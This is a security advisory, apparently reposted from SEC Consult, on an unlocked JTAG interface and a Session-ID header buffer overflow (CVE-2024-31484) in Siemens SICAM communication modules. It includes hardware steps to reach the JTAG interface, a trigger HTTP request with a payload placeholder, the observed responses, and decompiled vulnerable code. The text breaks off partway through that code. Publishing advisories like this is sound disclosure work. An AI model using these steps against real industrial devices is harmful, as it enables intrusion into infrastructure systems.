---
title: Siemens Unlocked JTAG Interface / Buffer Overflow
url: https://cxsecurity.com/issue/WLB-2024120009
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-12-06
fetch_date: 2025-10-06T19:33:25.954324
---

# Siemens Unlocked JTAG Interface / Buffer Overflow

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Siemens Unlocked JTAG Interface / Buffer Overflow** **2024.12.05**  Credit:  **[Stefan Viehboeck](https://cxsecurity.com/author/Stefan%2BViehboeck/1/)**  Risk: **High**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2024-31484](https://cxsecurity.com/cveshow/CVE-2024-31484/ "Click to see CVE-2024-31484")**  CWE: **[CWE-119](https://cxsecurity.com/cwe/CWE-119 "Click to see CWE-119")** | |

SEC Consult Vulnerability Lab Security Advisory < 20241125-0 >
=======================================================================
title: Unlocked JTAG interface and buffer overflow
product: Siemens SM-2558 Protocol Element (extension module for
Siemens SICAM AK3/TM/BC),
Siemens CP-2016 & CP-2019
vulnerable version: JTAG: Unknown HW revision, Zynq Firmware Version 10A45
Buffer overflow: <V10.46 (ETA4), <V03.27 (ETA5),
<V06.02 (CPCX26), <V06.05 (PCCX26)
fixed version: JTAG: SM-2558 hardware is EOL
Buffer overflow: V06.02 (CPCX26), V10.46 (ETA4),
V03.27 (ETA5), V06.05 (PCCX26)
impact: High
homepage: https://www.siemens.com
found: 2023-07-11
by: Stefan Viehböck (Office Linz)
Constantin Schieber-Knöbl (Office Vienna)
SEC Consult Vulnerability Lab
An integrated part of SEC Consult, an Eviden business
Europe | Asia
https://www.sec-consult.com
=======================================================================
Vendor description:
-------------------
"We are a technology company focused on industry, infrastructure,
transport, and healthcare. From more resource-efficient factories,
resilient supply chains, and smarter buildings and grids, to cleaner
and more comfortable transportation as well as advanced healthcare,
we create technology with purpose adding real value for customers."
Source: https://new.siemens.com/global/en/company/about.html
Business recommendation:
------------------------
Upgrade to the latest firmware version to mitigate the buffer overflow.
The hardware (SM-2558) is considered end of life (EOL), thus no new
version with a fixed JTAG will be released. Restrict physical access
to the device.
SEC Consult highly recommends to perform a thorough security review of the
product conducted by security professionals to identify and resolve potential
further security issues.
Vulnerability overview/description:
-----------------------------------
1) Unlocked JTAG Interface of Zynq-7000 on SM-2558
The JTAG interface can be accessed with physical access to the PCB.
After slightly modifying the hardware it is possible to connect to
the interface with full access to the communication module.
2) Buffer Overflow on the Webserver of the SM-2558, CP-2016 & CP-2019 (CVE-2024-31484)
The webserver running on the SM-2558 device as well as CP-2016 and CP-2019
is vulnerable to a buffer overflow vulnerability.
The value of the HTTP header "Session-ID" is processed and used in an
"sprintf" call without proper length checking. The target buffer is in the
BSS segment and likely 1024 bytes in length. The buffer overflows into several
other global data structures.
Proof of concept:
-----------------
1) Unlocked JTAG Interface of Zynq-7000 on SM-2558
The JTAG interface pins (TDI, TDO, TCK, TMS, GND) are accessible on a populated
20-pin header on the PCB (see [figure\_1]).
A removed connection needs to be restored by soldering an additional wire
between two exposed contacts (see [figure\_2]), as the JTAG interface of the
Zynq-7000 is daisy-chained with the JTAG interface of the Broadcom BCM53101M
Ethernet controller. The pad in question connects to pin A57 (TDI) of the Ethernet
controller. After connecting to the pins, a connection to the Zynq-7000 JTAG
interface is possible. E.g., memory can be dumped ([figure\_5]), execution can be
single stepped ([figure\_4]) or halted ([figure\_3]), and variables changed.
This grants an attacker with physical access full control of the communication
module.
2) Buffer Overflow on the Webserver of the SM-2558, CP-2016 & CP-2019 (CVE-2024-31484)
The vulnerability can be triggered with a HTTP POST request similar to the
following one:
POST /SICAM\_TOOLBOX\_1703\_remote\_connection\_01.htm HTTP/1.1
User-Agent: SICAM TOOLBOX II
Version: 1
Session-ID: 3814280BA9922f30\_BOF\_PAYLOAD\_HERE
Sequence-ID: 525
Content-Length: 54
Content-Type: text/plain
KeepAlive: 5
Connection: close
type=1&length=15&data=0780640202fef1e60000feff0100c2
Here are a few observations with different Session-ID values:
a) Session ID value 3814280BA9922f30 results in normal behavior
HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA992fd0
Sequence-ID: 1
Content-Type: text/plain
Content-Length: 8
type=4
b) Session ID value 3814280BA992fd00000000000000 results in normal behavior
HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA992fd00000000000000
Sequence-ID: 1
Content-Type: text/plain
Content-Length: 0
c) Session ID value 3814280BA992fd00000000000000... (in total 618 characters) results in three HTTP responses
HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA992fd000000HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA992fd000000HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA992
Sequence-ID: 1
Content-Type: text/plain
Content-Length: 8
type=4
d) Session ID value 3814280BA992fd00000000000000... (in total 1260 characters) results in a HTTP 500 - internal server error
HTTP/1.1 500 Internal Server Error
Content-Type: text/html
Content-Length: 198
<html><head><title>500 Internal Server Error</title></head><body><h1>Internal Server Error</h1><p>Sorry, an unexpected internal server error occurred while processing your request.</p></body></html>
Pseudocode of vulnerable function:
[...]
sessiond\_id = (char \*)get\_http\_header(a1, (int)"Session-ID"); <<<<<<<<<<<<<<<< session\_id is extracted from HTTP request
if ( !sessiond\_id )
goto LABEL\_194;
if ( unk\_51CD1C )
{
v11 = 0;
}
else
{
sub\_3DB0E4((unsigned int)byte\_51CD08, (unsigned int)sessiond\_id, 0x14u);
v11 = 1;
}
if ( sub\_15332C() == 1 )
{
v134 = 0;
if ( sub\_155BC4(a1, (int)v133) || !v134 )
{
LABEL\_49:
sequence\_id = get\_http\_header\_int(a1, "Sequence-ID");
sprintf...